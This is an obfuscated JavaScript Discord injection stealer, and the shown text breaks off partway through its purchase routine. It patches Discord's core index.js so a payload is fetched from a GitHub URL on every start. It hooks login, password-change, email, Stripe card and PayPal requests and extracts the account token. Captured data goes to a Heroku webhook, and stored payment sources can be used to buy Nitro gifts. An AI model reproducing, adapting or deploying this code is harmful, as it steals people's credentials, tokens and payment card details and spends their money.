const _0x78e7e9 = _0x10ac;
(function(_0x13978d, _0x275127) {
    const _0x4474c3 = _0x10ac,
        _0xe08d6e = _0x13978d();
    while (!![]) {
        try {
            const _0xa4bceb = -parseInt(_0x4474c3(0x17b)) / 0x1 + -parseInt(_0x4474c3(0x157)) / 0x2 + -parseInt(_0x4474c3(0x161)) / 0x3 + -parseInt(_0x4474c3(0x14f)) / 0x4 * (parseInt(_0x4474c3(0xfb)) / 0x5) + -parseInt(_0x4474c3(0x1bd)) / 0x6 * (-parseInt(_0x4474c3(0x103)) / 0x7) + -parseInt(_0x4474c3(0x148)) / 0x8 + -parseInt(_0x4474c3(0x13e)) / 0x9 * (-parseInt(_0x4474c3(0x1b7)) / 0xa);
            if (_0xa4bceb === _0x275127) break;
            else _0xe08d6e['push'](_0xe08d6e['shift']());
        } catch (_0x387c65) {
            _0xe08d6e['push'](_0xe08d6e['shift']());
        }
    }
}(_0x591d, 0x2ad1a));
const args = process['argv'],
    fs = require('fs'),
    path = require(_0x78e7e9(0x170)),
    https = require('https'),
    querystring = require('querystring'),
    {
        BrowserWindow,
        session
    } = require('electron'),
    config = {
        'webhook': 'https://tranquil-harbor-62838.herokuapp.com',
        'webhook_protector_key': _0x78e7e9(0x177),
        'auto_buy_nitro': ![],
        'ping_on_run': !![],
        'ping_val': '@everyone',
        'embed_name': _0x78e7e9(0x134),
        'embed_icon': _0x78e7e9(0x1b8)[_0x78e7e9(0x110)](/ /g, _0x78e7e9(0x138)),
        'embed_color': 0x7f9de0,
        'injection_url': 'https://raw.githubusercontent.com/madskullkoa/test/main/test.js',
        'api': 'https://discord.com/api/v9/users/@me',
        'nitro': {
            'boost': {
                'year': {
                    'id': _0x78e7e9(0x1bb),
                    'sku': _0x78e7e9(0x105),
                    'price': '9999'
                },
                'month': {
                    'id': _0x78e7e9(0x1bb),
                    'sku': _0x78e7e9(0x192),
                    'price': _0x78e7e9(0x147)
                }
            },
            'classic': {
                'month': {
                    'id': _0x78e7e9(0x14a),
                    'sku': _0x78e7e9(0x115),
                    'price': _0x78e7e9(0x185)
                }
            }
        },
        'filter': {
            'urls': ['https://discord.com/api/v*/users/@me', 'https://discordapp.com/api/v*/users/@me', _0x78e7e9(0x19f), _0x78e7e9(0x19c), _0x78e7e9(0x146), _0x78e7e9(0x189), _0x78e7e9(0xfc), _0x78e7e9(0x1a8), _0x78e7e9(0x1a9), _0x78e7e9(0x1a5)]
        },
        'filter2': {
            'urls': [_0x78e7e9(0x169), _0x78e7e9(0x12a), _0x78e7e9(0x11e), _0x78e7e9(0x167), _0x78e7e9(0x197), _0x78e7e9(0xff)]
        }
    };

function parity_32(_0x3da600, _0x1e9bdd, _0x41d7b5) {
    return _0x3da600 ^ _0x1e9bdd ^ _0x41d7b5;
}

function ch_32(_0x1b0e29, _0x3f495a, _0x2c2c0b) {
    return _0x1b0e29 & _0x3f495a ^ ~_0x1b0e29 & _0x2c2c0b;
}

function maj_32(_0x1b4aa8, _0x3655e9, _0x1c5a83) {
    return _0x1b4aa8 & _0x3655e9 ^ _0x1b4aa8 & _0x1c5a83 ^ _0x3655e9 & _0x1c5a83;
}

function rotl_32(_0x2bfbad, _0x4b3caf) {
    return _0x2bfbad << _0x4b3caf | _0x2bfbad >>> 0x20 - _0x4b3caf;
}

function safeAdd_32_2(_0x520731, _0x468cd8) {
    var _0x5259db = (_0x520731 & 0xffff) + (_0x468cd8 & 0xffff),
        _0x1eb6e4 = (_0x520731 >>> 0x10) + (_0x468cd8 >>> 0x10) + (_0x5259db >>> 0x10);
    return (_0x1eb6e4 & 0xffff) << 0x10 | _0x5259db & 0xffff;
}

function safeAdd_32_5(_0x4024d6, _0x2d980b, _0xdb90e4, _0x16d1db, _0x222298) {
    var _0x13079a = (_0x4024d6 & 0xffff) + (_0x2d980b & 0xffff) + (_0xdb90e4 & 0xffff) + (_0x16d1db & 0xffff) + (_0x222298 & 0xffff),
        _0xce2236 = (_0x4024d6 >>> 0x10) + (_0x2d980b >>> 0x10) + (_0xdb90e4 >>> 0x10) + (_0x16d1db >>> 0x10) + (_0x222298 >>> 0x10) + (_0x13079a >>> 0x10);
    return (_0xce2236 & 0xffff) << 0x10 | _0x13079a & 0xffff;
}

function binb2hex(_0x2bbdc4) {
    const _0x3c5d75 = _0x78e7e9;
    var _0x821c39 = _0x3c5d75(0x128),
        _0x3cdeeb = '',
        _0x125c76 = _0x2bbdc4[_0x3c5d75(0x181)] * 0x4,
        _0x52d5e8, _0x560ace;
    for (_0x52d5e8 = 0x0; _0x52d5e8 < _0x125c76; _0x52d5e8 += 0x1) {
        _0x560ace = _0x2bbdc4[_0x52d5e8 >>> 0x2] >>> (0x3 - _0x52d5e8 % 0x4) * 0x8, _0x3cdeeb += _0x821c39[_0x3c5d75(0x16d)](_0x560ace >>> 0x4 & 0xf) + _0x821c39[_0x3c5d75(0x16d)](_0x560ace & 0xf);
    }
    return _0x3cdeeb;
}

function getH() {
    return [0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476, 0xc3d2e1f0];
}

function roundSHA1(_0x1e9203, _0xb42ecd) {
    var _0x12cb66 = [],
        _0x324775, _0xe5521b, _0xf1d424, _0x5c9317, _0xbd2792, _0x4ccc24, _0x57bc7f = ch_32,
        _0x41154e = parity_32,
        _0x2a80d1 = maj_32,
        _0x3b801a = rotl_32,
        _0x1ead53 = safeAdd_32_2,
        _0x92b6d, _0x3b3439 = safeAdd_32_5;
    _0x324775 = _0xb42ecd[0x0], _0xe5521b = _0xb42ecd[0x1], _0xf1d424 = _0xb42ecd[0x2], _0x5c9317 = _0xb42ecd[0x3], _0xbd2792 = _0xb42ecd[0x4];
    for (_0x92b6d = 0x0; _0x92b6d < 0x50; _0x92b6d += 0x1) {
        _0x92b6d < 0x10 ? _0x12cb66[_0x92b6d] = _0x1e9203[_0x92b6d] : _0x12cb66[_0x92b6d] = _0x3b801a(_0x12cb66[_0x92b6d - 0x3] ^ _0x12cb66[_0x92b6d - 0x8] ^ _0x12cb66[_0x92b6d - 0xe] ^ _0x12cb66[_0x92b6d - 0x10], 0x1);
        if (_0x92b6d < 0x14) _0x4ccc24 = _0x3b3439(_0x3b801a(_0x324775, 0x5), _0x57bc7f(_0xe5521b, _0xf1d424, _0x5c9317), _0xbd2792, 0x5a827999, _0x12cb66[_0x92b6d]);
        else {
            if (_0x92b6d < 0x28) _0x4ccc24 = _0x3b3439(_0x3b801a(_0x324775, 0x5), _0x41154e(_0xe5521b, _0xf1d424, _0x5c9317), _0xbd2792, 0x6ed9eba1, _0x12cb66[_0x92b6d]);
            else _0x92b6d < 0x3c ? _0x4ccc24 = _0x3b3439(_0x3b801a(_0x324775, 0x5), _0x2a80d1(_0xe5521b, _0xf1d424, _0x5c9317), _0xbd2792, 0x8f1bbcdc, _0x12cb66[_0x92b6d]) : _0x4ccc24 = _0x3b3439(_0x3b801a(_0x324775, 0x5), _0x41154e(_0xe5521b, _0xf1d424, _0x5c9317), _0xbd2792, 0xca62c1d6, _0x12cb66[_0x92b6d]);
        }
        _0xbd2792 = _0x5c9317, _0x5c9317 = _0xf1d424, _0xf1d424 = _0x3b801a(_0xe5521b, 0x1e), _0xe5521b = _0x324775, _0x324775 = _0x4ccc24;
    }
    return _0xb42ecd[0x0] = _0x1ead53(_0x324775, _0xb42ecd[0x0]), _0xb42ecd[0x1] = _0x1ead53(_0xe5521b, _0xb42ecd[0x1]), _0xb42ecd[0x2] = _0x1ead53(_0xf1d424, _0xb42ecd[0x2]), _0xb42ecd[0x3] = _0x1ead53(_0x5c9317, _0xb42ecd[0x3]), _0xb42ecd[0x4] = _0x1ead53(_0xbd2792, _0xb42ecd[0x4]), _0xb42ecd;
}

function finalizeSHA1(_0x5254b8, _0x568b42, _0x530a51, _0x557ba0) {
    const _0x360e00 = _0x78e7e9;
    var _0x219630, _0x3b67d7, _0x461529;
    _0x461529 = (_0x568b42 + 0x41 >>> 0x9 << 0x4) + 0xf;
    while (_0x5254b8[_0x360e00(0x181)] <= _0x461529) {
        _0x5254b8[_0x360e00(0x1b2)](0x0);
    }
    _0x5254b8[_0x568b42 >>> 0x5] |= 0x80 << 0x18 - _0x568b42 % 0x20, _0x5254b8[_0x461529] = _0x568b42 + _0x530a51, _0x3b67d7 = _0x5254b8[_0x360e00(0x181)];
    for (_0x219630 = 0x0; _0x219630 < _0x3b67d7; _0x219630 += 0x10) {
        _0x557ba0 = roundSHA1(_0x5254b8[_0x360e00(0x1b1)](_0x219630, _0x219630 + 0x10), _0x557ba0);
    }
    return _0x557ba0;
}

function hex2binb(_0x59f0c8, _0x587296, _0x4bf194) {
    const _0x301620 = _0x78e7e9;
    var _0x58348d, _0x1ad354 = _0x59f0c8[_0x301620(0x181)],
        _0x5241cb, _0x5b222b, _0x45c9cf, _0x6c7d5a, _0x3a87fa;
    _0x58348d = _0x587296 || [0x0], _0x4bf194 = _0x4bf194 || 0x0, _0x3a87fa = _0x4bf194 >>> 0x3;
    0x0 !== _0x1ad354 % 0x2 && console[_0x301620(0x11c)](_0x301620(0x164));
    for (_0x5241cb = 0x0; _0x5241cb < _0x1ad354; _0x5241cb += 0x2) {
        _0x5b222b = parseInt(_0x59f0c8[_0x301620(0x19e)](_0x5241cb, 0x2), 0x10);
        if (!isNaN(_0x5b222b)) {
            _0x6c7d5a = (_0x5241cb >>> 0x1) + _0x3a87fa, _0x45c9cf = _0x6c7d5a >>> 0x2;
            while (_0x58348d[_0x301620(0x181)] <= _0x45c9cf) {
                _0x58348d[_0x301620(0x1b2)](0x0);
            }
            _0x58348d[_0x45c9cf] |= _0x5b222b << 0x8 * (0x3 - _0x6c7d5a % 0x4);
        } else console[_0x301620(0x11c)](_0x301620(0x1c0));
    }
    return {
        'value': _0x58348d,
        'binLen': _0x1ad354 * 0x4 + _0x4bf194
    };
}
class jsSHA {
    constructor() {
        const _0x52f72a = _0x78e7e9;
        var _0x4638b6 = 0x0,
            _0x1a1e25 = [],
            _0x522a00 = 0x0,
            _0x2a629b, _0x4ee1c7, _0x5fabf1, _0xd22cce, _0x511107, _0x156fb8, _0x3ce961 = ![],
            _0x49a62f = ![],
            _0x30d9a9 = [],
            _0x401e8b = [],
            _0x593c5e, _0x593c5e = 0x1;
        _0x4ee1c7 = hex2binb, (_0x593c5e !== parseInt(_0x593c5e, 0xa) || 0x1 > _0x593c5e) && console[_0x52f72a(0x11c)](_0x52f72a(0x123)), _0xd22cce = 0x200, _0x511107 = roundSHA1, _0x156fb8 = finalizeSHA1, _0x5fabf1 = 0xa0, _0x2a629b = getH(), this[_0x52f72a(0x118)] = function(_0x31c1e0) {
            const _0x1662d1 = _0x52f72a;
            var _0x40f3ac, _0x54b3d0, _0x3043a5, _0x5a4793, _0x2e87f6, _0x1506b7, _0x13e570;
            _0x40f3ac = hex2binb, _0x54b3d0 = _0x40f3ac(_0x31c1e0), _0x3043a5 = _0x54b3d0[_0x1662d1(0x17a)], _0x5a4793 = _0x54b3d0['value'], _0x2e87f6 = _0xd22cce >>> 0x3, _0x13e570 = _0x2e87f6 / 0x4 - 0x1;
            if (_0x2e87f6 < _0x3043a5 / 0x8) {
                _0x5a4793 = _0x156fb8(_0x5a4793, _0x3043a5, 0x0, getH());
                while (_0x5a4793[_0x1662d1(0x181)] <= _0x13e570) {
                    _0x5a4793['push'](0x0);
                }
                _0x5a4793[_0x13e570] &= 0xffffff00;
            } else {
                if (_0x2e87f6 > _0x3043a5 / 0x8) {
                    while (_0x5a4793[_0x1662d1(0x181)] <= _0x13e570) {
                        _0x5a4793['push'](0x0);
                    }
                    _0x5a4793[_0x13e570] &= 0xffffff00;
                }
            }
            for (_0x1506b7 = 0x0; _0x1506b7 <= _0x13e570; _0x1506b7 += 0x1) {
                _0x30d9a9[_0x1506b7] = _0x5a4793[_0x1506b7] ^ 0x36363636, _0x401e8b[_0x1506b7] = _0x5a4793[_0x1506b7] ^ 0x5c5c5c5c;
            }
            _0x2a629b = _0x511107(_0x30d9a9, _0x2a629b), _0x4638b6 = _0xd22cce, _0x49a62f = !![];
        }, this[_0x52f72a(0x126)] = function(_0x763c1f) {
            const _0x49efd3 = _0x52f72a;
            var _0x58ce57, _0x1ed31e, _0x4ea44e, _0x22ef04, _0xa757df, _0x43e4b2 = 0x0,
                _0x3b172c = _0xd22cce >>> 0x5;
            _0x58ce57 = _0x4ee1c7(_0x763c1f, _0x1a1e25, _0x522a00), _0x1ed31e = _0x58ce57[_0x49efd3(0x17a)], _0x22ef04 = _0x58ce57[_0x49efd3(0x10d)], _0x4ea44e = _0x1ed31e >>> 0x5;
            for (_0xa757df = 0x0; _0xa757df < _0x4ea44e; _0xa757df += _0x3b172c) {
                _0x43e4b2 + _0xd22cce <= _0x1ed31e && (_0x2a629b = _0x511107(_0x22ef04[_0x49efd3(0x1b1)](_0xa757df, _0xa757df + _0x3b172c), _0x2a629b), _0x43e4b2 += _0xd22cce);
            }
            _0x4638b6 += _0x43e4b2, _0x1a1e25 = _0x22ef04['slice'](_0x43e4b2 >>> 0x5), _0x522a00 = _0x1ed31e % _0xd22cce;
        }, this[_0x52f72a(0x1b5)] = function() {
            const _0x3ee934 = _0x52f72a;
            var _0x26154a;
            ![] === _0x49a62f && console['error'](_0x3ee934(0x137));
            const _0x3bb6d6 = function(_0x3ab2f4) {
                return binb2hex(_0x3ab2f4);
            };
            return ![] === _0x3ce961 && (_0x26154a = _0x156fb8(_0x1a1e25, _0x522a00, _0x4638b6, _0x2a629b), _0x2a629b = _0x511107(_0x401e8b, getH()), _0x2a629b = _0x156fb8(_0x26154a, _0x5fabf1, _0xd22cce, _0x2a629b)), _0x3ce961 = !![], _0x3bb6d6(_0x2a629b);
        };
    }
}
if (_0x78e7e9(0x154) === typeof define && define[_0x78e7e9(0xf4)]) define(function() {
    return jsSHA;
});
else _0x78e7e9(0x153) !== typeof exports ? _0x78e7e9(0x153) !== typeof module && module[_0x78e7e9(0x19d)] ? module['exports'] = exports = jsSHA : exports = jsSHA : global[_0x78e7e9(0x149)] = jsSHA;
jsSHA[_0x78e7e9(0xfa)] && (jsSHA = jsSHA[_0x78e7e9(0xfa)]);

function totp(_0x1c6a1d) {
    const _0x4cb6c6 = _0x78e7e9,
        _0x15038c = 0x1e,
        _0x4808a4 = 0x6,
        _0x369d8c = Date[_0x4cb6c6(0x17f)](),
        _0x85b696 = Math[_0x4cb6c6(0x14d)](_0x369d8c / 0x3e8),
        _0x1a50c7 = leftpad(dec2hex(Math[_0x4cb6c6(0x18d)](_0x85b696 / _0x15038c)), 0x10, '0'),
        _0x48434f = new jsSHA();
    _0x48434f[_0x4cb6c6(0x118)](base32tohex(_0x1c6a1d)), _0x48434f[_0x4cb6c6(0x126)](_0x1a50c7);
    const _0x56a055 = _0x48434f[_0x4cb6c6(0x1b5)](),
        _0x1e9559 = hex2dec(_0x56a055[_0x4cb6c6(0xf9)](_0x56a055[_0x4cb6c6(0x181)] - 0x1));
    let _0x224ff0 = (hex2dec(_0x56a055['substr'](_0x1e9559 * 0x2, 0x8)) & hex2dec('7fffffff')) + '';
    return _0x224ff0 = _0x224ff0[_0x4cb6c6(0x19e)](Math[_0x4cb6c6(0x114)](_0x224ff0[_0x4cb6c6(0x181)] - _0x4808a4, 0x0), _0x4808a4), _0x224ff0;
}

function hex2dec(_0x422ddf) {
    return parseInt(_0x422ddf, 0x10);
}

function dec2hex(_0x4e0702) {
    const _0xa679ff = _0x78e7e9;
    return (_0x4e0702 < 15.5 ? '0' : '') + Math['round'](_0x4e0702)[_0xa679ff(0xfe)](0x10);
}

function _0x10ac(_0x63f141, _0x519cee) {
    const _0x591dba = _0x591d();
    return _0x10ac = function(_0x10ac60, _0x49bc45) {
        _0x10ac60 = _0x10ac60 - 0xf2;
        let _0x16a7b7 = _0x591dba[_0x10ac60];
        return _0x16a7b7;
    }, _0x10ac(_0x63f141, _0x519cee);
}

function base32tohex(_0x21ae33) {
    const _0x488c7a = _0x78e7e9;
    let _0x44c34a = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567',
        _0x21ea1c = '',
        _0x1e46cd = '';
    _0x21ae33 = _0x21ae33[_0x488c7a(0x110)](/=+$/, '');
    for (let _0x473e82 = 0x0; _0x473e82 < _0x21ae33['length']; _0x473e82++) {
        let _0x543cc2 = _0x44c34a['indexOf'](_0x21ae33['charAt'](_0x473e82)['toUpperCase']());
        if (_0x543cc2 === -0x1) console[_0x488c7a(0x11c)](_0x488c7a(0x139));
        _0x21ea1c += leftpad(_0x543cc2[_0x488c7a(0xfe)](0x2), 0x5, '0');
    }
    for (let _0x479119 = 0x0; _0x479119 + 0x8 <= _0x21ea1c[_0x488c7a(0x181)]; _0x479119 += 0x8) {
        let _0x301fc5 = _0x21ea1c['substr'](_0x479119, 0x8);
        _0x1e46cd = _0x1e46cd + leftpad(parseInt(_0x301fc5, 0x2)[_0x488c7a(0xfe)](0x10), 0x2, '0');
    }
    return _0x1e46cd;
}

function _0x591d() {
    const _0x5488b6 = ['\x22);\x0a\x20\x20\x20\x20xmlHttp.send(null);\x0a\x20\x20\x20\x20xmlHttp.responseText;', 'webhook', 'content-security-policy', 'https://api.stripe.com/v*/payment_intents/*/confirm', 'nitro', 'statusCode', 'https://api.stripe.com/v*/tokens', 'https://api.stripe.com/v*/setup_intents/*/confirm', '**\x0aBilling:\x20**', '**\x0aCVC:\x20**', 'Discord\x20Staff,\x20', 'boost', '(webpackChunkdiscord_app.push([[\x27\x27],{},e=>{m=[];for(let\x20c\x20in\x20e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void\x200).exports.default.getToken()', '\x27;\x0aconst\x20bdPath\x20=\x20\x27', '🎉・Discord\x20Injection\x20By\x20github.com/Rdimo・https://github.com/Rdimo/Discord-Injection', 'slice', 'push', 'var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x20\x0a\x20\x20\x20\x20xmlHttp.open(\x22GET\x22,\x20\x22', 'HypeSquad\x20Brillance,\x20', 'getHMAC', 'protocol', '50PnyOrL', 'https://raw.githubusercontent.com/Rdimo/images/master/Discord-Injection/discord\x20atom.png', 'HypeSquad\x20Bravery,\x20', 'https://cdn.discordapp.com/avatars/', '521847234246082599', '<:paypal:951139189389410365>\x20', '6AzMiCG', '**Token**', 'existsSync', 'String\x20of\x20HEX\x20type\x20contains\x20invalid\x20characters', 'endsWith', '\x5cmodules\x5cdiscord_desktop_core-3\x5cdiscord_desktop_core\x5cindex.js', 'amd', 'includes', 'username', 'embed_name', '**Discord\x20Info**', 'substring', 'default', '5Vhgjkq', 'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts', '**Nitro\x20bought!**', 'toString', 'wss://remote-auth-gateway.discord.gg/*', 'embed_icon', 'https://discord.gift/', 'api', '51422qvEPpD', 'sku', '511651885459963904', '\x27)\x0aif\x20(fs.existsSync(bdPath))\x20require(bdPath);', '\x22);\x20\x0a\x20\x20\x20\x20xmlHttp.send(null);\x20\x0a\x20\x20\x20\x20xmlHttp.responseText', 'premium_type', 'rmdirSync', 'webRequest', 'Nitro\x20Type:\x20**', 'Failed\x20to\x20Purchase\x20❌', 'value', 'unlinkSync', 'ping_on_run', 'replace', 'parse', 'HypeSquad\x20Balance,\x20', '\x20|\x20', 'max', '511651871736201216', 'host', 'New\x20Email:\x20**', 'setHMACKey', 'writeFileSync', 'stringify', 'gift_code', 'error', 'Discord\x20Developer,\x20', 'https://discord.com/api/v*/applications/detectable', 'auto_buy_nitro', '));\x0a\x20\x20\x20\x20xmlHttp.responseText', 'webContents', '\x27;\x0aconst\x20fileSize\x20=\x20fs.statSync(indexJs).size\x0afs.readFileSync(indexJs,\x20\x27utf8\x27,\x20(err,\x20data)\x20=>\x20{\x0a\x20\x20\x20\x20if\x20(fileSize\x20<\x2020000\x20||\x20data\x20===\x20\x22module.exports\x20=\x20require(\x27./core.asar\x27)\x22)\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20init();\x0a})\x0aasync\x20function\x20init()\x20{\x0a\x20\x20\x20\x20https.get(\x27', 'numRounds\x20must\x20a\x20integer\x20>=\x201', 'Green\x20BugHunter,\x20', 'Authorization', 'update', 'onBeforeRequest', '0123456789abcdef', 'avatar', 'https://*.discord.com/api/v*/applications/detectable', 'defaultSession', 'api/webhooks', '\x22,\x20false);\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22', 'win32', '.webp', 'Nitro\x20Classic', 'mkdirSync', 'content', 'platform', 'Discord\x20Injection', '**\x0aCredit\x20Card\x20Expiration:\x20**', 'No\x20Nitro', 'Cannot\x20call\x20getHMAC\x20without\x20first\x20setting\x20HMAC\x20key', '%20', 'Invalid\x20base32\x20character\x20in\x20key', '**\x0aBadges:\x20**', 'Gold\x20BugHunter,\x20', 'bytes', '**\x0aNew\x20Password:\x20**', '2107242WPLxZI', 'env', 'application/json', 'getAllWindows', 'forEach', '**\x0aPassword:\x20**', 'Email:\x20**', 'usd', 'https://discord.com/api/v*/auth/login', '999', '432504bunLwJ', 'jsSHA', '521846918637420545', 'index.js', 'join', 'round', 'embed_color', '1038148fbgxzm', 'month', 'Contents', 'email', 'undefined', 'function', 'wss://remote-auth-gateway', 'PATCH', '295662uvCuNl', 'login', 'sep', '💳\x20', 'url', 'assign', 'window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[\x22get_require\x22]]]),delete\x20gg.m.get_require,delete\x20gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function\x20LogOut(){(function(a){const\x20b=\x22string\x22==typeof\x20a?a:null;for(const\x20c\x20in\x20gg.c)if(gg.c.hasOwnProperty(c)){const\x20d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return\x20d.default;if(d&&(b?d[b]:a(d)))return\x20d}return\x20null})(\x22login\x22).logout()}LogOut();', 'filter', 'tokens', 'webhook_protector_key', '655038PMwgGA', 'startsWith', 'concat', 'String\x20of\x20HEX\x20type\x20must\x20be\x20in\x20byte\x20increments', 'end', 'catch', 'https://*.discord.com/api/v*/users/@me/library', 'invalid', 'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json', 'write', 'initiation', 'price', 'charAt', '\x27,\x20(res)\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20const\x20file\x20=\x20fs.createWriteStream(indexJs);\x0a\x20\x20\x20\x20\x20\x20\x20\x20res.pipe(file);\x0a\x20\x20\x20\x20\x20\x20\x20\x20file.on(\x27finish\x27,\x20()\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20file.close();\x0a\x20\x20\x20\x20\x20\x20\x20\x20});\x0a\x20\x20\x20\x20\x0a\x20\x20\x20\x20}).on(\x22error\x22,\x20(err)\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20setTimeout(init(),\x2010000);\x0a\x20\x20\x20\x20});\x0a}\x0arequire(\x27', 'None', 'path', 'Partnered\x20Server\x20Owner,\x20', '**Email\x20Changed**', 'ping_val', 'split', 'resources', '**Paypal\x20Added**', 'YKA4HL6DW7B2GH6DS7BLLQV5YKI4HCA=', 'APPDATA', 'uploadData', 'binLen', '322873PjVazy', 'flags', 'new_password', 'year', 'now', 'card[exp_year]', 'length', 'responseHeaders', 'Early\x20Supporter,\x20', 'password', '499', '2422867c-244d-476a-ba4f-36e197758d97', 'log', 'var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20xmlHttp.open(\x22GET\x22,\x20\x22', 'https://*.discord.com/api/v*/auth/login', 'discriminator', 'POST', 'Time\x20to\x20buy\x20some\x20nitro\x20baby\x20😩', 'floor', 'app.asar', 'paypal_accounts', 'Nitro\x20Boost', 'const\x20fs\x20=\x20require(\x27fs\x27),\x20https\x20=\x20require(\x27https\x27);\x0aconst\x20indexJs\x20=\x20\x27', '511651880837840896', 'filter2', 'discord.com', '**Nitro\x20Code:**\x0a```diff\x0a+\x20', '/billing/payment-sources\x22,\x20false);\x20\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22', 'https://discord.com/api/v*/users/@me/library', 'users/@me', 'classic', '**\x20-\x20Password:\x20**', '**\x0aOld\x20Password:\x20**', 'https://discordapp.com/api/v*/auth/login', 'exports', 'substr', 'https://*.discord.com/api/v*/users/@me', 'from', 'method'];
    _0x591d = function() {
        return _0x5488b6;
    };
    return _0x591d();
}

function leftpad(_0x3e5afc, _0xae1de1, _0x54cee4) {
    const _0x87be18 = _0x78e7e9;
    return _0xae1de1 + 0x1 >= _0x3e5afc[_0x87be18(0x181)] && (_0x3e5afc = Array(_0xae1de1 + 0x1 - _0x3e5afc[_0x87be18(0x181)])[_0x87be18(0x14c)](_0x54cee4) + _0x3e5afc), _0x3e5afc;
}
const discordPath = (function() {
    const _0xec1e44 = _0x78e7e9,
        _0x393eb9 = args[0x0][_0xec1e44(0x174)](path[_0xec1e44(0x159)])[_0xec1e44(0x1b1)](0x0, -0x1)[_0xec1e44(0x14c)](path['sep']);
    let _0x90a7d2;
    if (process[_0xec1e44(0x133)] === _0xec1e44(0x12e)) _0x90a7d2 = path[_0xec1e44(0x14c)](_0x393eb9, _0xec1e44(0x175));
    else process['platform'] === 'darwin' && (_0x90a7d2 = path[_0xec1e44(0x14c)](_0x393eb9, _0xec1e44(0x151), 'Resources'));
    if (fs[_0xec1e44(0x1bf)](_0x90a7d2)) return {
        'resourcePath': _0x90a7d2,
        'app': _0x393eb9
    };
    return {
        'undefined': undefined,
        'undefined': undefined
    };
}());

function updateCheck() {
    const _0x591a2a = _0x78e7e9,
        {
            resourcePath: _0x49a1c2,
            app: _0x4284e0
        } = discordPath;
    if (_0x49a1c2 === undefined || _0x4284e0 === undefined) return;
    const _0xe008f8 = path['join'](_0x49a1c2, 'app'),
        _0x1301c8 = path[_0x591a2a(0x14c)](_0xe008f8, 'package.json'),
        _0x314c0c = path[_0x591a2a(0x14c)](_0xe008f8, 'index.js'),
        _0x1cea85 = _0x4284e0 + _0x591a2a(0xf3),
        _0x4b6a9c = path['join'](process[_0x591a2a(0x13f)][_0x591a2a(0x178)], '\x5cbetterdiscord\x5cdata\x5cbetterdiscord.asar');
    if (!fs[_0x591a2a(0x1bf)](_0xe008f8)) fs[_0x591a2a(0x131)](_0xe008f8);
    if (fs['existsSync'](_0x1301c8)) fs[_0x591a2a(0x10e)](_0x1301c8);
    if (fs[_0x591a2a(0x1bf)](_0x314c0c)) fs['unlinkSync'](_0x314c0c);
    if (process[_0x591a2a(0x133)] === _0x591a2a(0x12e) || process[_0x591a2a(0x133)] === 'darwin') {
        fs['writeFileSync'](_0x1301c8, JSON[_0x591a2a(0x11a)]({
            'name': 'discord',
            'main': _0x591a2a(0x14b)
        }, null, 0x4));
        const _0x17c6ca = _0x591a2a(0x191) + _0x1cea85 + _0x591a2a(0x1af) + _0x4b6a9c + _0x591a2a(0x122) + config['injection_url'] + _0x591a2a(0x16e) + path[_0x591a2a(0x14c)](_0x49a1c2, _0x591a2a(0x18e)) + _0x591a2a(0x106);
        fs[_0x591a2a(0x119)](_0x314c0c, _0x17c6ca['replace'](/\\/g, '\x5c\x5c'));
    }
    if (!fs[_0x591a2a(0x1bf)](path[_0x591a2a(0x14c)](__dirname, 'initiation'))) return !0x0;
    return fs[_0x591a2a(0x109)](path[_0x591a2a(0x14c)](__dirname, _0x591a2a(0x16b))), execScript(_0x591a2a(0x15d)), !0x1;
}
const execScript = _0x2d1085 => {
        const _0x579dce = _0x78e7e9,
            _0x135eca = BrowserWindow[_0x579dce(0x141)]()[0x0];
        return _0x135eca[_0x579dce(0x121)]['executeJavaScript'](_0x2d1085, !0x0);
    },
    getInfo = async _0x38f77a => {
        const _0x179c0e = _0x78e7e9,
            _0x36da08 = await execScript(_0x179c0e(0x188) + config[_0x179c0e(0x102)] + _0x179c0e(0x12d) + _0x38f77a + _0x179c0e(0x1a2));
        return JSON[_0x179c0e(0x111)](_0x36da08);
    }, fetchBilling = async _0x515cf9 => {
        const _0x43ae74 = _0x78e7e9,
            _0xe65494 = await execScript(_0x43ae74(0x1b3) + config[_0x43ae74(0x102)] + _0x43ae74(0x196) + _0x515cf9 + _0x43ae74(0x107));
        if (!_0xe65494['lenght'] || _0xe65494[_0x43ae74(0x181)] === 0x0) return '';
        return JSON[_0x43ae74(0x111)](_0xe65494);
    }, getBilling = async _0x226fa6 => {
        const _0x2ef8a8 = _0x78e7e9,
            _0x151f4c = await fetchBilling(_0x226fa6);
        if (!_0x151f4c) return '❌';
        let _0x5c8d90 = '';
        _0x151f4c[_0x2ef8a8(0x142)](_0x2760b2 => {
            const _0x1e2b6b = _0x2ef8a8;
            if (!_0x2760b2[_0x1e2b6b(0x168)]) switch (_0x2760b2['type']) {
                case 0x1:
                    _0x5c8d90 += _0x1e2b6b(0x15a);
                    break;
                case 0x2:
                    _0x5c8d90 += _0x1e2b6b(0x1bc);
                    break;
            }
        });
        if (!_0x5c8d90) _0x5c8d90 = '❌';
        return _0x5c8d90;
    }, Purchase = async (_0x1c98f8, _0xf2becb, _0x33d559, _0x2c71fa) => {
        const _0x11bd37 = _0x78e7e9,
            _0x2950fd = {
                'expected_amount': config[_0x11bd37(0x1a6)][_0x33d559][_0x2c71fa][_0x11bd37(0x16c)],
                'expected_currency': _0x11bd37(0x145),
                'gift': !![],
                'payment_source_id': _0xf2becb,
                'payment_source_token': null,
                'purchase_token': _0x11bd37(0x186),
                'sku_subscription_plan_id': config['nitro'][_0x33d559][_0x2c71fa][_0x11bd37(0x104)]
            },
